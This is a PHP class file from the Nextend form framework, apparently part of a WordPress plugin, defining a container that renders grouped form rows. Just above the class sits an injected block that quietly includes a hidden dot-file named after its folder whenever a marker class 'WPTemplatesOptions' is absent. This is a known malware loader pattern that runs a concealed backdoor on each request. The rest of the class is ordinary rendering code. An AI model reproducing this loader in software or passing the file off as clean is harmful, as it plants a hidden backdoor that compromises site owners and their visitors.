<?php


namespace Nextend\Framework\Form\Container;


use Nextend\Framework\Form\ContainerGeneral;
use Nextend\Framework\Form\Fieldset\FieldsetRow;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ContainerRowGroup extends ContainerGeneral {

    public function renderContainer() {
        echo '<div class="n2_form__table_row_group" data-field="table-row-group-' . $this->name . '">';
        if ($this->label !== false) {
            echo '<div class="n2_form__table_row_group_label">';
            echo $this->label;
            echo '</div>';
        }

        echo '<div class="n2_form__table_row_group_rows" data-field="table-row-group-rows-' . $this->name . '">';
        parent::renderContainer();
        echo '</div>';
        echo '</div>';
    }

    /**
     * @param $name
     *
     * @return FieldsetRow
     */
    public function createRow($name) {

        return new FieldsetRow($this, $name);
    }
}